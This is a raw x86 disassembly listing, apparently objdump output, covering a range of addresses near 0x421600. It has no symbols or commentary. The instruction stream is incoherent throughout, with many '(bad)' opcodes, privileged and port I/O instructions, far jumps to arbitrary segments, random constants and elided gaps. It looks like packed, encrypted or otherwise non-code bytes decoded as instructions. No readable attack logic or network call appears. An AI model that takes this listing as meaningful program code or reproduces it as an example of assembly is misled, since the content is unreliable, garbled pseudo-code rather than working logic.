  4215f2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4215f3:	dec    ebx
  4215f4:	sbb    ecx,edx
  4215f6:	ret    
  4215f7:	or     al,0xfb
  4215f9:	jb     0x4215a2
  4215fb:	pop    esp
  4215fc:	jg     0x4215d2
  4215fe:	cli    
  4215ff:	out    dx,eax
  421600:	cmp    al,0x54
  421602:	lods   al,BYTE PTR ds:[esi]
  421603:	add    eax,0x17730c88
  421608:	inc    esp
  421609:	xchg   edx,eax
  42160a:	jecxz  0x4215c9
  42160c:	pop    ebx
  42160d:	repz xlat BYTE PTR ds:[ebx]
  42160f:	mov    dh,al
  421611:	mov    ah,0x1f
  421613:	call   0xc558:0xc219db7f
  42161a:	addr16 jl 0x4215d8
  42161d:	bound  ecx,QWORD PTR [edx+0x6867c2c5]
  421623:	int3   
  421624:	rcr    DWORD PTR [edx-0x359ce49c],1
  42162a:	push   es
  42162b:	mov    esp,0x685679d7
  421630:	stos   DWORD PTR es:[edi],eax
  421631:	jns    0x42168e
  421633:	mov    bl,0x20
  421635:	add    ebx,DWORD PTR [edi-0x6313927e]
  42163b:	ja     0x4215ee
  42163d:	push   edx
  42163e:	xchg   edx,eax
  42163f:	mov    DWORD PTR [edi-0x5d7b16f8],ebx
  421645:	rcr    DWORD PTR [eax],cl
  421647:	mov    edi,DWORD PTR [ebx+0xe]
  42164a:	cs mov bl,0x5b
  42164d:	scas   eax,DWORD PTR es:[edi]
  42164e:	loope  0x4216c8
  421650:	xchg   BYTE PTR [esi+eax*1+0x66],dl
  421654:	fisub  DWORD PTR [ebp+edi*8+0xe]
  421658:	std    
  421659:	or     bh,0x84
  42165c:	jl     0x42165d
  42165e:	jp     0x4216d8
  421660:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421661:	jb     0x421686
  421663:	sti    
  421664:	mov    eax,ds:0x12a3660b
  421669:	mov    bx,0x88c3
  42166d:	inc    edi
  42166e:	outs   dx,DWORD PTR ds:[esi]
  42166f:	dec    edi
  421670:	jmp    0x4216b1
  421672:	jge    0x421634
  421674:	sub    BYTE PTR [eax],dl
  421676:	ins    BYTE PTR es:[edi],dx
  421677:	das    
  421678:	clc    
  421679:	and    al,0x9c
  42167b:	jno    0x421691
  42167d:	pop    ss
  42167e:	mov    ds:0x5b67e95d,al
  421683:	xor    DWORD PTR [esi],eax
  421685:	cmp    DWORD PTR [edi+0x76f183e3],esp
  42168b:	dec    esi
  42168c:	inc    ebp
  42168d:	nop
  42168e:	aam    0xd1
  421690:	aad    0xc
  421692:	or     DWORD PTR [eax],ebp
  421694:	neg    BYTE PTR [eax-0x5f]
  421697:	or     DWORD PTR [ebx],ebp
  421699:	mov    DWORD PTR [edx-0x76a2e023],ebp
  42169f:	dec    eax
  4216a0:	in     al,0xe6
  4216a2:	sahf   
  4216a3:	cmc    
  4216a4:	lds    ebx,FWORD PTR [esi]
  4216a6:	scas   al,BYTE PTR es:[edi]
  4216a7:	stc    
  4216a8:	jge    0x421685
  4216aa:	pop    ds
  4216ab:	and    eax,0x9facb908
  4216b0:	ins    DWORD PTR es:[edi],dx
  4216b1:	enter  0x307c,0x31
  4216b5:	mov    fs,ecx
  4216b7:	xor    ebx,DWORD PTR [esi]
  4216b9:	xor    DWORD PTR [edx+0x7b504939],ebp
  4216bf:	ror    BYTE PTR [esi],cl
  4216c1:	xor    eax,0xa54dfe05
  4216c6:	cmp    cl,BYTE PTR [edx-0x7f0e92da]
  4216cc:	(bad)  
  4216cd:	mov    ebx,0x5c4c7e1a
  4216d2:	loope  0x42171f
  4216d4:	mov    cl,0xbb
  4216d6:	mov    ebp,0x34e13e58
  4216db:	pop    ebp
  4216dc:	sub    BYTE PTR [ecx-0x325e318c],dl
  4216e2:	aaa    
  4216e3:	pop    ebp
  4216e4:	sti    
  4216e5:	xor    DWORD PTR [eax],ebx
  4216e7:	or     esi,edi
  4216e9:	mov    al,0x59
  4216eb:	mov    esp,0xa850f8
	...
  4216f8:	add    BYTE PTR [eax],al
  4216fa:	and    BYTE PTR [esi],dl
  4216fc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4216fd:	lea    esi,[esi+0x44bf29bf]
  421703:	sub    esp,esi
  421705:	test   BYTE PTR [ebp-0xf7bbe9a],0x92
  42170c:	add    DWORD PTR [eax],eax
  42170e:	std    
  42170f:	add    DWORD PTR [eax],eax
  421711:	add    BYTE PTR [edi+ebx*2+0x56818f58],cl
  421718:	clc    
  421719:	pop    es
  42171a:	int3   
  42171b:	mov    ?,WORD PTR [esi-0x59e731fe]
  421721:	push   ss
  421722:	and    dl,BYTE PTR [esi+0x4e]
  421725:	ds push es
  421727:	jbe    0x421741
  421729:	dec    eax
  42172a:	mov    edi,0xe3401acc
  42172f:	loopne 0x421753
  421731:	call   0x25202ab4
  421736:	jmp    FWORD PTR [eax+0x7b]
  421739:	ins    DWORD PTR es:[edi],dx
  42173a:	xor    esi,edx
  42173c:	pop    eax
  42173d:	aaa    
  42173e:	fcmovnb st,st(2)
  421740:	sub    BYTE PTR [ebp+eax*8+0x13],al
  421744:	jmp    0x4217a9
  421746:	jge    0x42173e
  421748:	lods   eax,DWORD PTR ds:[esi]
  421749:	pop    es
  42174a:	pop    edx
  42174b:	loop   0x421780
  42174d:	outs   dx,DWORD PTR ds:[esi]
  42174e:	popf   
  42174f:	popf   
  421750:	push   ecx
  421751:	ins    BYTE PTR es:[edi],dx
  421752:	test   BYTE PTR [edx-0x43],0x52
  421756:	es jo  0x4217a7
  421759:	mov    ah,ah
  42175b:	add    BYTE PTR [ecx+ebx*8+0x1b],bl
  42175f:	addr16 popf 
  421761:	mov    al,0x4a
  421763:	jae    0x421787
  421765:	in     eax,dx
  421766:	pop    es
  421767:	div    DWORD PTR [edi+0x6a]
  42176a:	inc    esi
  42176b:	or     ecx,DWORD PTR [ebp+0x7884399f]
  421771:	push   ebx
  421772:	adc    eax,0x4d89d6d9
  421777:	add    esp,DWORD PTR [ebp+ebx*4+0x75]
  42177b:	cld    
  42177c:	inc    eax
  42177d:	ficom  WORD PTR [ecx-0x1e]
  421780:	jne    0x4217fd
  421782:	pop    ebp
  421783:	ror    BYTE PTR ds:0x8eab543c,0x34
  42178a:	mov    ch,0xaf
  42178c:	cmp    al,0x2b
  42178e:	ret    
  42178f:	mov    edx,0xf393e38a
  421794:	inc    ebx
  421795:	inc    ebp
  421796:	shl    cl,cl
  421798:	sbb    BYTE PTR [edx+0x390eaa69],al
  42179e:	mov    dh,0x9f
  4217a0:	mov    ds,WORD PTR [ebx]
  4217a2:	enter  0xf713,0x44
  4217a6:	fs push ecx
  4217a8:	fisubr DWORD PTR [edx+ebx*2-0x46b6d362]
  4217af:	cmp    al,0x4a
  4217b1:	sbb    eax,0x839ebfd4
  4217b6:	ret    
  4217b7:	pushf  
  4217b8:	xchg   dl,bl
  4217ba:	scas   eax,DWORD PTR es:[edi]
  4217bb:	mov    al,0xb0
  4217bd:	in     eax,0x67
  4217bf:	dec    ecx
  4217c0:	add    bh,BYTE PTR [esi-0x2fb22cf5]
  4217c6:	frstor [ecx]
  4217c8:	xchg   DWORD PTR ds:0xf050d44f,ecx
  4217ce:	out    dx,al
  4217cf:	inc    edx
  4217d0:	xchg   ebx,eax
  4217d1:	shl    DWORD PTR [ecx-0x68a1ad18],cl
  4217d7:	jle    0x4217dc
  4217d9:	inc    edi
  4217da:	pop    ebp
  4217db:	ja     0x4217e0
  4217dd:	push   ds
  4217de:	cmp    al,0x60
  4217e0:	psubq  mm5,QWORD PTR [edi]
  4217e3:	das    
  4217e4:	bound  edi,QWORD PTR [eax-0x69]
  4217e7:	stos   BYTE PTR es:[edi],al
  4217e8:	add    BYTE PTR [ebx+ebx*1],ah
  4217eb:	xchg   DWORD PTR [ebp-0x38],ecx
  4217ee:	push   ebp
  4217ef:	rol    ah,1
  4217f1:	test   DWORD PTR [eax],edi
  4217f3:	mov    edx,0x8894896c
  4217f8:	mov    al,ds:0x7b6ee6ff
  4217fd:	sub    DWORD PTR [ecx],esi
  4217ff:	inc    ecx
  421800:	or     ecx,0x4b
  421803:	xchg   edx,eax
  421804:	mov    esp,DWORD PTR [edi-0x64c86314]
  42180a:	xor    BYTE PTR [ebx-0x52],cl
  42180d:	stos   BYTE PTR es:[edi],al
  42180e:	inc    ecx
  42180f:	or     al,0x3e
  421811:	or     cl,BYTE PTR [eax]
  421813:	jb     0x4217e4
  421815:	mov    edx,DWORD PTR [esi+esi*4-0x79]
  421819:	ds pop ss
  42181b:	aam    0xd0
  42181d:	dec    eax
  42181e:	pushf  
  42181f:	cmp    ecx,DWORD PTR [edx-0x5c]
  421822:	adc    esi,DWORD PTR [ebx]
  421824:	mov    ch,0xf1
  421826:	repz js 0x42189a
  421829:	mov    ds:0x32e1a241,al
  42182e:	push   cs
  42182f:	cmp    ch,BYTE PTR [ebp-0x5c6b8515]
  421835:	outs   dx,DWORD PTR ds:[esi]
  421836:	xor    DWORD PTR [edi],eax
  421838:	and    bl,BYTE PTR [edi+0x3aa800da]
  42183e:	sahf   
  42183f:	mov    WORD PTR [ebx-0x2a3fcf8b],cs
  421845:	lahf   
  421846:	push   es
  421847:	ficom  WORD PTR [esi-0x1b]
  42184a:	push   eax
  42184b:	repnz (bad) 
  42184d:	in     eax,0x33
  42184f:	xchg   esi,eax
  421850:	loope  0x4217e9
  421852:	(bad)  
  421853:	js     0x421836
  421855:	xor    BYTE PTR [ebp+0x6e],dl
  421858:	mov    ebp,0x39db1d08
  42185d:	pop    eax
  42185e:	push   edx
  42185f:	mov    edx,0xce99fe
  421864:	push   cs
  421865:	ins    BYTE PTR es:[edi],dx
  421866:	adc    DWORD PTR [esi-0x5d],0xffffff8d
  42186a:	fwait
  42186b:	in     al,0xce
  42186d:	jle    0x421895
  42186f:	jno    0x42189e
  421871:	rol    dh,cl
  421873:	or     esi,edx
  421875:	call   0x53a6b261
  42187a:	outs   dx,DWORD PTR ds:[esi]
  42187b:	lds    esp,FWORD PTR [eax+0x75]
  42187e:	fwait
  42187f:	bound  eax,QWORD PTR [edx]
  421881:	icebp  
  421882:	add    BYTE PTR [edx+0x3ccf94c3],ah
  421888:	sub    BYTE PTR [ebp-0x540c6c16],bh
  42188e:	je     0x421830
  421890:	and    eax,0xf0a002b7
  421895:	mov    ?,WORD PTR [eax-0x3b71c359]
  42189b:	in     al,0xd0
  42189d:	es xchg ecx,eax
  42189f:	(bad)  
  4218a0:	or     al,0x1f
  4218a2:	(bad)  
  4218a3:	jmp    DWORD PTR [eax-0x4f801702]
  4218a9:	lods   eax,DWORD PTR ds:[esi]
  4218aa:	xor    ebp,ecx
  4218ac:	and    al,0x55
  4218ae:	(bad)  [eax]
  4218b0:	adc    eax,0x43f6d858
  4218b5:	mov    al,0x1c
  4218b7:	cmc    
  4218b8:	aas    
  4218b9:	xor    al,0xd1
  4218bb:	aas    
  4218bc:	aaa    
  4218bd:	jae    0x421880
  4218bf:	lds    esi,FWORD PTR [edi+0x4a5120db]
  4218c5:	sub    esi,DWORD PTR [edi-0x68]
  4218c8:	mov    ds,WORD PTR [ecx]
  4218ca:	mov    bl,0xe0
  4218cc:	gs jbe 0x42193f
  4218cf:	sub    BYTE PTR [edi+0x3887af0a],al
  4218d5:	sbb    eax,0xbd39d9ff
  4218da:	mov    al,0x4c
  4218dc:	sub    ecx,DWORD PTR [ecx]
  4218de:	sbb    al,0x1a
  4218e0:	cmc    
  4218e1:	xchg   edi,eax
  4218e2:	adc    BYTE PTR [edx-0x38],cl
  4218e5:	adc    DWORD PTR [edx],ebx
  4218e7:	or     al,0x9
  4218e9:	push   eax
  4218ea:	sub    ebx,0x3dea7768
  4218f0:	sub    ch,BYTE PTR [ebp-0x3771debb]
  4218f6:	in     al,0xce
  4218f8:	in     eax,dx
  4218f9:	inc    edi
  4218fa:	retf   
  4218fb:	pop    ss
  4218fc:	xchg   ecx,eax
  4218fd:	sbb    dl,al
  4218ff:	pop    edi
  421900:	sahf   
  421901:	inc    esp
  421902:	xor    BYTE PTR [ebx-0x51e956bc],ch
  421908:	lock js 0x4218a2
  42190b:	or     BYTE PTR [edx],dl
  42190d:	(bad)  
  42190e:	pop    edx
	...
  421917:	add    BYTE PTR [eax],al
  421919:	add    BYTE PTR [eax-0x4456c5cd],dh
  42191f:	test   eax,0x428f3bb3
  421924:	mov    esp,0x6cba768a
  421929:	inc    esp
  42192a:	in     eax,dx
  42192b:	xchg   esp,eax
  42192c:	add    DWORD PTR [eax],eax
  42192e:	std    
  42192f:	add    DWORD PTR [eax],eax
  421931:	add    bh,dl
  421933:	push   edi
  421934:	rcr    esi,cl
  421936:	jbe    0x421999
  421938:	adc    al,BYTE PTR [edi+0x7e]
  42193b:	dec    ecx
  42193c:	mov    DWORD PTR [ebx-0x74],edi
  42193f:	inc    eax
  421940:	test   eax,0x2acf93db
  421945:	(bad)  
  421946:	fisttp WORD PTR [ecx+0x40]
  421949:	mov    edi,0xc3da410a
  42194e:	(bad)  
  42194f:	lods   eax,DWORD PTR ds:[esi]
  421950:	(bad)  
  421952:	mov    bh,0xea
  421954:	retf   0xd185
  421957:	jo     0x421937
  421959:	sbb    al,0x42
  42195b:	dec    esp
  42195c:	or     bh,BYTE PTR [eax+0x6555efb7]
  421962:	shl    DWORD PTR [ecx],cl
  421964:	pop    ebx
  421965:	ror    BYTE PTR [eax],cl
  421967:	sbb    al,ah
  421969:	and    al,0x64
  42196b:	dec    eax
  42196c:	adc    edi,DWORD PTR es:[edi-0x25]
  421970:	mov    BYTE PTR [edx+0x4b],dh
  421973:	push   edi
  421974:	or     eax,DWORD PTR [eax]
  421976:	push   esi
  421977:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421978:	shl    DWORD PTR [esi-0x615d8be],0x15
  42197f:	push   edi
  421980:	sti    
  421981:	sbb    cl,dh
  421983:	mov    ds:0x8a42734,eax
  421988:	push   ebx
  421989:	cli    
  42198a:	push   eax
  42198b:	fcmovb st,st(7)
  42198d:	ret    
  42198e:	xor    bh,al
  421990:	dec    esi
  421991:	ins    DWORD PTR es:[edi],dx
  421992:	xchg   ecx,eax
  421993:	das    
  421994:	dec    esp
  421995:	adc    al,0xf8
  421997:	xchg   ah,dh
  421999:	push   ss
  42199a:	push   cs
  42199b:	add    al,0x46
  42199d:	aas    
  42199e:	loope  0x421986
  4219a0:	xchg   ecx,eax
  4219a1:	or     eax,0xc05ae826
  4219a6:	repnz jecxz 0x42192c
  4219a9:	mov    esp,0x172b313b
  4219ae:	scas   al,BYTE PTR es:[edi]
  4219af:	lods   eax,DWORD PTR ds:[esi]
  4219b0:	je     0x42194f
  4219b2:	sub    al,0x72
  4219b4:	sbb    DWORD PTR [eax-0x79],ebp
  4219b7:	int    0x79
  4219b9:	jns    0x42194b
  4219bb:	sbb    DWORD PTR [eax],ebp
  4219bd:	cmp    eax,0xab50edef
  4219c2:	mov    ah,0x18
  4219c4:	mov    eax,ds:0x9f8f08a3
  4219c9:	jecxz  0x421972
  4219cb:	mov    ch,BYTE PTR [edx+ecx*1-0x3f]
  4219cf:	fcomp  QWORD PTR [edx+0x577035cd]
  4219d5:	xchg   dl,ch
  4219d7:	inc    edx
  4219d8:	mov    edx,0xbeed3af9
  4219dd:	mov    ebx,0x8f7e7d47
  4219e2:	out    0x4f,eax
  4219e4:	test   al,0xbd
  4219e6:	div    cl
  4219e8:	and    eax,0x7af52483
  4219ed:	mov    ecx,0x3b43f537
  4219f2:	int3   
  4219f3:	cli    
  4219f4:	add    BYTE PTR [edx-0x10ac922d],dh
  4219fa:	mov    DWORD PTR ds:0xe45927ce,edx
  421a00:	pushf  
  421a01:	xchg   BYTE PTR [edi-0x28],dh
  421a04:	or     esp,edx
  421a06:	xor    BYTE PTR [ebp-0x321ecca4],bh
  421a0c:	pop    ds
  421a0d:	(bad)  
  421a0e:	cmp    al,0xf2
  421a10:	ror    esp,0x12
  421a13:	hlt    
  421a14:	sub    esp,DWORD PTR [edi]
  421a16:	and    bh,dh
  421a18:	aad    0x39
  421a1a:	push   esi
  421a1b:	sbb    eax,0xf77ca06a
  421a20:	pop    esi
  421a21:	(bad)  
  421a22:	jl     0x421a18
  421a24:	xchg   BYTE PTR [ecx],cl
  421a26:	push   es
  421a27:	test   BYTE PTR [edx],bl
  421a29:	jp     0x421a0c
  421a2b:	loope  0x421a78
  421a2d:	nop
  421a2e:	and    ecx,DWORD PTR ds:0x91cc4178
  421a34:	sub    ch,BYTE PTR gs:[ebx-0x49]
  421a38:	and    eax,0xd45d2aa5
  421a3d:	mov    ebp,0x95ba4b1a
  421a42:	mov    dl,0x11
  421a44:	mov    cl,0x71
  421a46:	dec    ecx
  421a47:	pop    edx
  421a48:	sub    ebx,DWORD PTR [ebx+edx*8]
  421a4b:	cmp    al,0x83
  421a4d:	mov    bh,0xdb
  421a4f:	in     al,0x70
  421a51:	js     0x421a8c
  421a53:	out    dx,eax
  421a54:	xlat   BYTE PTR ds:[ebx]
  421a55:	(bad)  
  421a56:	retf   0x34af
  421a59:	and    eax,0x3efd8dc8
  421a5e:	jne    0x421a1c
  421a60:	and    bl,ch
  421a62:	mov    ecx,0xa511f416
  421a67:	xchg   edi,eax
  421a68:	imul   edi,edx,0xffffffdd
  421a6b:	lods   al,BYTE PTR ds:[esi]
  421a6c:	pop    edx
  421a6d:	je     0x421ae9
  421a6f:	imul   ecx,DWORD PTR [esi-0x1],0x49e8bab8
  421a76:	mov    bh,0xb7
  421a78:	jge    0x421a54
  421a7a:	ss or  eax,0xa6b11dcf
  421a80:	add    ecx,DWORD PTR [esi]
  421a82:	in     al,dx
  421a83:	int    0xcf
  421a85:	ret    0x4a04
  421a88:	imul   ebx,DWORD PTR [esp+esi*4],0x3f13fcb0
  421a8f:	add    DWORD PTR [ebp-0x46],0xf
  421a93:	mov    ah,bl
  421a95:	cmp    eax,0x75ad36c0
  421a9a:	sub    ebp,eax
  421a9c:	sbb    DWORD PTR [edi],esi
  421a9e:	xchg   ebx,eax
  421a9f:	cmp    bl,BYTE PTR [eax+0x387894fc]
  421aa5:	cs (bad) 
  421aa7:	js     0x421aeb
  421aa9:	shl    ah,cl
  421aab:	cmp    bh,BYTE PTR [ebp-0x7458c2ea]
  421ab1:	stos   DWORD PTR es:[edi],eax
  421ab2:	jno    0x421a91
  421ab4:	test   ah,cl
  421ab6:	xor    ebx,DWORD PTR [ebp-0x40]
  421ab9:	cdq    
  421aba:	jb     0x421a86
  421abc:	xor    eax,0x571eb7f4
  421ac1:	jbe    0x421abe
  421ac3:	adc    al,0x3c
  421ac5:	cs in  eax,0x55
  421ac8:	xchg   BYTE PTR [edi],bh
  421aca:	fsubr  QWORD PTR [ebx+0x1e]
  421acd:	inc    eax
  421ace:	std    
  421acf:	mov    dl,0xa3
  421ad1:	mov    cl,0xc0
  421ad3:	ins    BYTE PTR es:[edi],dx
  421ad4:	out    0x78,eax
  421ad6:	jg     0x421ad9
  421ad8:	pop    es
  421ad9:	cdq    
  421ada:	xchg   esp,eax
  421adb:	add    bh,BYTE PTR [edi]
  421add:	(bad)  
  421ade:	xor    DWORD PTR [edx-0xd],ecx
  421ae1:	or     esi,ebp
  421ae3:	pop    es
  421ae4:	into   
  421ae5:	add    al,0x4c
  421ae7:	push   edi
  421ae8:	xor    ecx,ebp
  421aea:	loope  0x421b35
  421aec:	jecxz  0x421afd
  421aee:	mov    al,0x9d
  421af0:	jecxz  0x421b58
  421af2:	or     dl,ch
  421af4:	mov    ch,0x8d
  421af6:	push   ecx
  421af7:	sbb    DWORD PTR [edi],esp
  421af9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421afa:	pusha  
  421afb:	dec    ecx
  421afc:	int    0xb3
  421afe:	aas    
  421aff:	mov    DWORD PTR [ebp+0x3f],eax
  421b02:	dec    ebx
  421b03:	gs xchg edx,eax
  421b05:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  421b06:	cmp    bl,BYTE PTR [ecx-0x45]
  421b09:	push   es
  421b0a:	inc    edx
  421b0b:	dec    edx
  421b0c:	sub    edx,DWORD PTR [edi]
  421b0e:	sar    BYTE PTR [eax+0x39],cl
  421b11:	jne    0x421b03
  421b13:	je     0x421b18
  421b15:	xchg   esi,eax
  421b16:	(bad)  [edi+esi*8]
  421b19:	pop    ebp
  421b1a:	les    esi,FWORD PTR [eax-0x6246a275]
  421b20:	mov    eax,0x1f44f109
  421b25:	jmp    0xe1b7:0xe8219fc4
  421b2c:	sub    ah,bl
  421b2e:	adc    al,0x0
	...
  421b38:	add    BYTE PTR [eax],al
  421b3a:	test   eax,0xff94c95e
  421b3f:	xchg   edi,eax
  421b40:	std    
  421b41:	jg     0x421b32
  421b43:	mov    edi,0x770ff8f7
  421b48:	inc    ebp
  421b49:	pop    ds
  421b4a:	jmp    0x1:0xfd000196
  421b51:	add    BYTE PTR [ecx],cl
  421b53:	jmp    0xb022966e
  421b58:	xchg   edi,eax
  421b59:	fcmovne st,st(2)
  421b5b:	or     al,0x92
  421b5d:	imul   DWORD PTR [ecx+0x7d]
  421b60:	stos   DWORD PTR es:[edi],eax
  421b61:	clc    
  421b62:	adc    BYTE PTR [ecx-0x63],ch
  421b65:	mov    ch,0xe5
  421b67:	mov    eax,ds:0xffbc3426
  421b6c:	jge    0x421b20
  421b6e:	loop   0x421bb4
  421b70:	test   eax,0x517e0bb8
  421b75:	bound  eax,QWORD PTR [edx-0x6362d96f]
  421b7b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421b7c:	sub    DWORD PTR [edx+ebp*1-0x65],edi
  421b80:	cmp    al,0x2f
  421b82:	les    edx,FWORD PTR [ecx+0x18]
  421b85:	mov    eax,0x1e31c96d
  421b8a:	adc    dh,BYTE PTR [eax+ecx*8+0x1b4781c3]
  421b91:	push   ebp
  421b92:	arpl   WORD PTR gs:0x9f26627e,si
  421b99:	ins    DWORD PTR es:[edi],dx
  421b9a:	daa    
  421b9b:	inc    edx
  421b9c:	adc    bh,cl
  421b9e:	xor    al,0x8c
  421ba0:	test   eax,0xbd1f0179
  421ba5:	sbb    DWORD PTR [eax+edi*1+0x19],ebx
  421ba9:	loopne 0x421c24
  421bab:	and    BYTE PTR [eax+ebx*1],ch
  421bae:	and    DWORD PTR [ecx-0x72],0x1e
  421bb2:	mov    ds:0x19162712,eax
  421bb7:	push   es
  421bb8:	cld    
  421bb9:	dec    ecx
  421bba:	mov    eax,ds:0xfc6600c
  421bbf:	xchg   edi,eax
  421bc0:	jne    0x421b6e
  421bc2:	test   al,dl
  421bc4:	xchg   DWORD PTR ds:0xdb7908c8,eax
  421bca:	pop    esp
  421bcb:	test   ebx,edx
  421bcd:	and    BYTE PTR [ecx+eax*2-0x63],bl
  421bd1:	inc    ebx
  421bd2:	(bad)  
  421bd4:	stos   DWORD PTR es:[edi],eax
  421bd5:	mov    esp,0xbaf264c2
  421bda:	(bad)  
  421bdb:	cld    
  421bdc:	add    eax,0xcefa9737
  421be1:	and    dl,dh
  421be3:	lods   eax,DWORD PTR ds:[esi]
  421be4:	sub    ah,ah
  421be6:	ins    DWORD PTR es:[edi],dx
  421be7:	jo     0x421c5b
  421be9:	data16 in al,dx
  421beb:	shl    bl,1
  421bed:	dec    esp
  421bee:	xor    edi,DWORD PTR [edx-0x14]
  421bf1:	fistp  DWORD PTR [ecx]
  421bf3:	cld    
  421bf4:	aas    
  421bf5:	xor    eax,0xa5c6803
  421bfa:	loop   0x421c55
  421bfc:	jecxz  0x421c3e
  421bfe:	addr16 (bad) 
  421c01:	shl    bl,1
  421c03:	or     ebp,0xffffffe5
  421c06:	fisttp DWORD PTR [ecx]
  421c08:	pop    edx
  421c09:	in     al,0x7b
  421c0b:	jne    0x421bef
  421c0d:	xor    DWORD PTR [esi],esi
  421c0f:	test   BYTE PTR [edx+0x69],0x79
  421c13:	jno    0x421c1f
  421c15:	ja     0x421bd9
  421c17:	(bad)  
  421c18:	lods   eax,DWORD PTR ds:[esi]
  421c19:	(bad)  
  421c1a:	jo     0x421c99
  421c1c:	lods   al,BYTE PTR ds:[esi]
  421c1d:	sbb    DWORD PTR [edx+0x74a70e8f],ebp
  421c23:	mov    al,ds:0x262cd1de
  421c28:	xlat   BYTE PTR ds:[ebx]
  421c29:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  421c2a:	fs scas al,BYTE PTR es:[edi]
  421c2c:	test   ebx,ebp
  421c2e:	jbe    0x421bd4
  421c30:	xchg   ch,ch
  421c32:	mov    ebp,0xf5f6676c
  421c37:	xor    BYTE PTR [ecx],cl
  421c39:	sbb    BYTE PTR [eax],cl
  421c3b:	out    dx,eax
  421c3c:	mov    bl,0xb1
  421c3e:	pop    ecx
  421c3f:	sub    cl,BYTE PTR [edi+eax*8-0x7261299f]
  421c46:	sbb    DWORD PTR [ecx],ebx
  421c48:	mov    esp,0x3b13a622
  421c4d:	popf   
  421c4e:	clc    
  421c4f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421c50:	xchg   esp,eax
  421c51:	add    ch,BYTE PTR [ecx-0x8b05b6]
  421c57:	inc    ebx
  421c58:	cmc    
  421c59:	fninit 
  421c5b:	gs push ebx
  421c5d:	cs cdq 
  421c5f:	test   BYTE PTR [esi+eiz*1-0x39],0xe0
  421c64:	repnz inc esi
  421c66:	push   ebx
  421c67:	xor    eax,0x88ef69bf
  421c6c:	cs cmc 
  421c6e:	push   ebp
  421c6f:	loop   0x421c42
  421c71:	(bad)  
  421c72:	clc    
  421c73:	add    DWORD PTR [edx],eax
  421c75:	daa    
  421c76:	pusha  
  421c77:	fsub   QWORD PTR [edx]
  421c79:	mov    esp,0xda78306a
  421c7e:	jne    0x421c41
  421c80:	dec    esp
  421c81:	bound  ecx,QWORD PTR [esi+0x57]
  421c84:	xchg   ecx,eax
  421c85:	retf   
  421c86:	scas   al,BYTE PTR es:[edi]
  421c87:	enter  0xceba,0x65
  421c8b:	pop    ds
  421c8c:	or     eax,0x1e6c9cb7
  421c91:	adc    DWORD PTR [ebx+ecx*1-0x2c],0xfffffff3
  421c96:	mov    cl,0x5f
  421c98:	jmp    0x421c73
  421c9a:	mov    edi,0x914c79fa
  421c9f:	or     BYTE PTR [eax-0x4e],ch
  421ca2:	sub    esp,DWORD PTR [edi-0x14d59cad]
  421ca8:	jp     0x421cb7
  421caa:	xchg   esi,eax
  421cab:	stc    
  421cac:	add    BYTE PTR [edx-0x1f],ah
  421caf:	scas   eax,DWORD PTR es:[edi]
  421cb0:	mov    dh,ch
  421cb2:	fiadd  WORD PTR [edx+0x44cff225]
  421cb8:	lahf   
  421cb9:	jmp    0x354c:0x89f108ca
  421cc0:	std    
  421cc1:	fdiv   QWORD PTR [eax-0x26]
  421cc4:	cmc    
  421cc5:	aad    0xe0
  421cc7:	sbb    DWORD PTR [edi-0x3d],edi
  421cca:	adc    dl,0xef
  421ccd:	call   0x69b6:0xc2dde1ea
  421cd4:	inc    ecx
  421cd5:	xor    al,0x42
  421cd8:	loop   0x421cd4
  421cda:	mov    bl,0x7e
  421cdc:	mov    dl,cl
  421cde:	retf   
  421cdf:	iret   
  421ce0:	in     eax,0xeb
  421ce2:	mov    ebp,0x205f4e33
  421ce7:	outs   dx,DWORD PTR ds:[esi]
  421ce8:	pop    ebx
  421ce9:	xchg   ecx,eax
  421cea:	xor    bl,bh
  421cec:	xlat   BYTE PTR ds:[ebx]
  421ced:	icebp  
  421cee:	xchg   ebp,eax
  421cef:	pop    esp
  421cf0:	ins    BYTE PTR es:[edi],dx
  421cf1:	mov    esi,0xa2627515
  421cf6:	push   ebx
  421cf7:	add    BYTE PTR [eax+0x25],ch
  421cfa:	push   eax
  421cfb:	and    DWORD PTR ds:0x11803142,esp
  421d01:	leave  
  421d02:	fs cli 
  421d04:	pop    esp
  421d05:	jae    0x421cbf
  421d07:	xchg   DWORD PTR [edx+0x7ef92a82],ebx
  421d0d:	fucom  st(3)
  421d0f:	and    ebp,DWORD PTR [esi+0xe]
  421d12:	mov    DWORD PTR [ebp-0x4753869a],edx
  421d18:	lahf   
  421d19:	scas   eax,DWORD PTR es:[edi]
  421d1a:	xor    BYTE PTR [esi],bl
  421d1c:	fidivr DWORD PTR [ebx-0x12]
  421d1f:	sbb    ah,bh
  421d21:	leave  
  421d22:	icebp  
  421d23:	ja     0x421d56
  421d25:	mov    eax,ds:0xb4e91ad2
  421d2a:	cmp    al,BYTE PTR [edx]
  421d2c:	mov    esi,0x50d11d8c
  421d31:	mov    eax,0x7949451b
  421d36:	or     DWORD PTR [edx],ecx
  421d38:	out    dx,al
  421d39:	push   esi
  421d3a:	ds in  eax,dx
  421d3c:	lods   al,BYTE PTR ds:[esi]
  421d3d:	shl    DWORD PTR [esi+0x1d5de7c7],1
  421d43:	xor    BYTE PTR [esi-0x70],cl
  421d46:	stos   DWORD PTR es:[edi],eax
  421d47:	test   DWORD PTR [edi-0x70],esi
  421d4a:	pop    esi
  421d4b:	sar    BYTE PTR [ebp+0x9],cl
  421d4e:	fld    QWORD PTR [eax]
	...
  421d58:	add    BYTE PTR [eax],al
  421d5a:	mov    ebx,0x7d7539cf
  421d5f:	idiv   edi
  421d61:	iret   
  421d62:	(bad)  
  421d63:	ror    DWORD PTR [ebp+0x6d],1
  421d66:	icebp  
  421d67:	fidivr DWORD PTR [edi-0x28]
  421d6a:	out    0x98,eax
  421d6c:	add    DWORD PTR [eax],eax
  421d6e:	std    
  421d6f:	add    DWORD PTR [eax],eax
  421d71:	add    dl,dh
  421d73:	mov    ebx,esi
  421d75:	test   BYTE PTR [esi-0x614818af],0xac
  421d7c:	mov    bh,0xe
  421d7e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
